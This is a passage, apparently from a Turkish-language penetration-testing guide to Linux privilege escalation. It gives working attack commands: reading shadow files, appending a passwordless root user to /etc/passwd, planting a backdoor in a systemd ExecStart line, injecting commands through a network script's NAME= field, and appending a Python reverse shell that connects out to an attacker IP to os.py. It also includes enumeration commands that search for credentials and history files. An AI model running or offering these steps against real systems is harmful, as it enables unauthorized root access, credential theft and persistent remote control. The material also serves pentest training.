SSH ajan yönlendirmesi, sunucunuzda (şifresiz!) anahtarlar bırakmak yerine **yerel SSH anahtarlarınızı kullanmanıza olanak tanır**. Bu sayede, ssh üzerinden bir **ana bilgisayara** **atlayabilecek** ve oradan **başka bir** ana bilgisayara **anahtar** kullanarak **atlayabileceksiniz**.

Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekmektedir:
```
Host example.com
ForwardAgent yes
```
Eğer `Host` `*` ise, kullanıcı herhangi bir makineye geçtiğinde, o makine anahtarlarına erişebilecektir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **seçenekleri geçersiz kılabilir** ve bu yapılandırmayı izin verebilir veya reddedebilir.\
`/etc/sshd_config` dosyası ssh-agent yönlendirmesine izin verebilir veya reddedebilir ve `AllowAgentForwarding` anahtar kelimesiyle yapılandırılabilir (varsayılan olarak izin verilir).

Eğer bir ortamda Forward Agent yapılandırıldığını fark ederseniz, ayrıcalıkları yükseltmek için bunu **kötüye kullanabilirsiniz**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## İlginç Dosyalar

### Profil Dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir kabuk çalıştırdığında **çalıştırılan betiklerdir**. Bu nedenle, bunlardan herhangi birini **yazabilir veya değiştirebilirseniz ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer garip bir profil betiği bulunursa, onu **duyarlı detaylar** açısından kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyalarının farklı bir isim kullanıyor olabileceği veya bir yedek dosya olabileceği göz önünde bulundurulmalıdır. Bu nedenle **hepsini bulmanız** ve içerisinde **hash'lerin olup olmadığını** görmek için onları okuyup okuyamadığınızı kontrol etmeniz önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyası içinde **şifre karmaları** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biri ile bir şifre oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan şifreyi ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` kullanarak `su` komutunu kullanabilirsiniz.

Alternatif olarak, şifresiz sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: Makinenin mevcut güvenliğini düşürebilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**NOT:** BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` dosyası `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **duyarlı dosyalara yazabilir mi** kontrol etmelisiniz. Örneğin, bazı **hizmet yapılandırma dosyalarına** yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makine **tomcat** sunucusunu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız**, o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### Klasörleri Kontrol Et

Aşağıdaki klasörler yedeklemeler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Sahip Dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son dakikalarda değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Komut Dosyaları/Binary Dosyaları**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedeklemeler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bilinen şifre içeren dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun, **şifre içerebilecek çeşitli dosyaları arar**.\
Bunu yapmak için kullanabileceğiniz **başka ilginç bir araç** ise: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) Windows, Linux ve Mac için yerel bir bilgisayarda depolanan birçok şifreyi almak için kullanılan açık kaynaklı bir uygulamadır.

### Günlükler

Günlükleri okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler bulabilirsiniz**. Günlük ne kadar garip olursa, o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (arka kapılı?) **denetim günlükleri**, size **şifreleri kaydetmenize** izin verebilir, bu konuyla ilgili olarak şu yazıda açıklanmıştır: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Günlükleri okumak için** [**adm**](https://github.com/linux-hardening/privilege-escalation/#adm-group) **grubu** gerçekten yardımcı olacaktır.

### Kabuk dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Genel Kimlik Bilgisi Arama/Regex

Ayrıca, adında "**password**" kelimesini içeren dosyaları ve içeriğinde de bu kelimeyi aramalısınız, ayrıca log dosyalarında IP'ler ve e-postaları veya hash'leri regexlerle kontrol etmelisiniz.\
Bunların nasıl yapılacağını burada listeleyeceğim, ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından gerçekleştirilen son kontrolleri kontrol edebilirsiniz.

## Yazılabilir Dosyalar

### Python kütüphane kaçırma

Bir python betiğinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabilirsiniz** veya **python kütüphanelerini değiştirebilirsiniz**, işletim sistemi kütüphanesini değiştirip arkasına kötü amaçlı yazılım ekleyebilirsiniz (python betiğinin çalıştırılacağı yere yazabilirseniz, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneye **kötü amaçlı yazılım eklemek** için sadece os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'daki bir zafiyet, bir günlük dosyasında veya üst dizinlerinde **yazma izinlerine** sahip olan kullanıcıların ayrıcalıklarını yükseltebilmelerine olanak tanır. Bu, genellikle **root** olarak çalışan `logrotate`'un, özellikle _**/etc/bash\_completion.d/**_ gibi dizinlerde keyfi dosyaları çalıştırmak için manipüle edilebileceği anlamına gelir. İzinleri sadece _/var/log_ dizininde değil, günlük döndürmenin uygulandığı herhangi bir dizinde kontrol etmek önemlidir.

{% hint style="info" %}
Bu zafiyet, `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler
{% endhint %}

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet, [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerdir, bu nedenle günlükleri değiştirebileceğinizde, günlükleri kimin yönettiğini kontrol edin ve günlükleri sembollerle değiştirerek ayrıcalıkları yükseltebilir mi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenden dolayı bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<neolursa>` betiği **yazabilirse** veya var olan bir betiği **ayarlayabilirse**, o zaman **sisteminiz ele geçirilmiştir**.

Ağ betikleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~kaynaklanır\~.

Benim durumumda, bu ağ betiklerindeki `NAME=` özelliği doğru bir şekilde işlenmiyor. İsimde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırıldığı anlamına gelir**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **System V init (SysVinit)** için betikleri içerir, klasik Linux hizmet yönetim sistemi. Hizmetleri `başlatmak`, `durdurmak`, `yeniden başlatmak` ve bazen `yeniden yüklemek` için betikler içerir. Bunlar doğrudan yürütülebilir veya `/etc/rc?.d/` dizininde bulunan sembolik bağlantılar aracılığıyla yürütülebilir. Redhat sistemlerinde alternatif bir yol ise `/etc/rc.d/init.d` dizinidir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir, Ubuntu tarafından tanıtılan daha yeni bir **hizmet yönetimi** kullanarak hizmet yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'e geçişe rağmen, Upstart yapılandırmalarıyla birlikte SysVinit betikleri hala kullanılmaktadır çünkü Upstart'te bir uyumluluk katmanı bulunmaktadır.

**systemd**, modern bir başlatma ve hizmet yöneticisi olarak ortaya çıkar, ihtiyaç duyulan daemon başlatma, otomatik bağlama yönetimi ve sistem durumu anlık görüntüleme gibi gelişmiş özellikler sunar. Dağıtım paketleri için dosyaları `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinlerine düzenler, sistem yönetimi sürecini basitleştirir.

## Diğer Püf Noktalar

### NFS Yetki Yükseltme

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Kısıtlanmış Kabuklardan Kaçma

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Çekirdek Güvenlik Korumaları

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha Fazla Yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Yetki Yükseltme Araçları

### **Linux yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'te çekirdek zafiyetlerini sıralar [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla betik derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
